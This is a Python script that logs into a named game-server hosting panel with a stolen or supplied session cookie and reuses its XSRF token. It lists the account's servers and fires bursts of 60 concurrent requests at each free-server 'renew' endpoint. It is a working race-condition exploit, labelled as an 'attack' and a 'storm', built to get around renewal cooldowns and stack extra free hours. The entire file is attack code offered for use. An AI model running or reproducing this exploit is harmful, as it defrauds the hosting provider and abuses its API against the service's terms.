import aiohttp
import asyncio
import sys
import random
import re
import os
import json
from urllib.parse import unquote

# === CONFIGURATION ===
BASE_URL = "https://gpanel.eternalzero.cloud"
RAW_COOKIE = os.environ.get("ETERNAL_COOKIE")

if not RAW_COOKIE:
    print("[!] FATAL: ETERNAL_COOKIE secret is missing.")
    sys.exit(1)

# === ATTACK SETTINGS ===
BURST_SIZE = 60
TIMEOUT = 15

# === COOKIE SETUP ===
initial_cookies = {}
if "pterodactyl_session" not in RAW_COOKIE:
    initial_cookies['pterodactyl_session'] = RAW_COOKIE
else:
    for item in RAW_COOKIE.split(';'):
        if '=' in item:
            k, v = item.strip().split('=', 1)
            initial_cookies[k] = v

# === HEADER FACTORY ===
def get_headers(session, referer=None):
    # Base Headers
    h = {
        'authority': 'gpanel.eternalzero.cloud',
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': BASE_URL,
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    
    # CRITICAL: Extract XSRF-TOKEN from cookies and add to header
    # The API requires the header 'x-xsrf-token' to match the cookie 'XSRF-TOKEN'
    xsrf_cookie = None
    for cookie in session.cookie_jar:
        if cookie.key == 'XSRF-TOKEN':
            # We must unquote it because cookies are often URL-encoded
            xsrf_cookie = unquote(cookie.value)
            break
            
    if xsrf_cookie:
        h['x-xsrf-token'] = xsrf_cookie
    
    if referer:
        h['referer'] = referer
        
    return h

# === STEP 1: AUTHENTICATE & HEAL COOKIES ===
async def authenticate(session):
    print("[*] Connecting to Dashboard to heal cookies...")
    try:
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        async with session.get(BASE_URL, headers=headers) as resp:
            text = await resp.text()

            if "login" in str(resp.url) or "Sign in" in text:
                print("\n[!] AUTH FAILED: Redirected to Login.")
                sys.exit(1)

            if resp.status == 200:
                # Check if we got the cookie we need
                cookies = [c.key for c in session.cookie_jar]
                if 'XSRF-TOKEN' in cookies:
                    print("[+] XSRF-TOKEN Cookie acquired.")
                    return True
                else:
                    print("[!] Loaded dashboard but Server did not send XSRF-TOKEN cookie.")
                    return False
            else:
                print(f"[!] Dashboard Status: {resp.status}")
    except Exception as e:
        print(f"[!] Auth Error: {e}")
    return False

# === STEP 2: GET SERVER LIST ===
async def get_server_list(session):
    print("[*] Fetching server list via API...")
    try:
        # Pass session so get_headers can extract the token
        async with session.get(f"{BASE_URL}/api/client", headers=get_headers(session)) as resp:
            if resp.status == 200:
                data = await resp.json()
                servers = []
                for item in data['data']:
                    attr = item['attributes']
                    servers.append({
                        'name': attr['name'],
                        'uuid': attr['uuid'],
                        'short': attr['identifier']
                    })
                print(f"[+] Found {len(servers)} servers.")
                return servers
            else:
                print(f"[!] API Error {resp.status}: {await resp.text()}")
    except Exception as e:
        print(f"[!] List Error: {e}")
    return []

# === STEP 3: THE STORM ===
async def storm_server(session, server):
    target_url = f"{BASE_URL}/api/client/freeservers/{server['uuid']}/renew"
    print(f"\n[>>>] TARGET: {server['name']} ({server['short']})")
    
    headers = get_headers(session, referer=f"{BASE_URL}/server/{server['short']}")
    
    tasks = []
    for i in range(BURST_SIZE):
        tasks.append(fire_shot(session, target_url, headers))
    
    print(f"      FIRING {BURST_SIZE} REQUESTS...")
    results = await asyncio.gather(*tasks)
    
    hits = results.count(True)
    if hits > 0:
        print(f"[$$$] SUCCESS! Added +{hits * 4} Hours")
    else:
        print(f"[---] No Hits (Cooldown or Blocked)")

async def fire_shot(session, url, headers):
    try:
        async with session.post(url, json={}, headers=headers, params={'z': random.random()}) as resp:
            await resp.read()
            return resp.status in [200, 201]
    except:
        return False

# === MAIN ===
async def main():
    connector = aiohttp.TCPConnector(limit=0, force_close=True)
    async with aiohttp.ClientSession(cookies=initial_cookies, connector=connector) as session:
        
        if await authenticate(session):
            servers = await get_server_list(session)
            if servers:
                print("-" * 40)
                for server in servers:
                    await storm_server(session, server)
                    await asyncio.sleep(1) 
                print("-" * 40)
                print("[*] FLEET RENEWAL COMPLETE.")

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
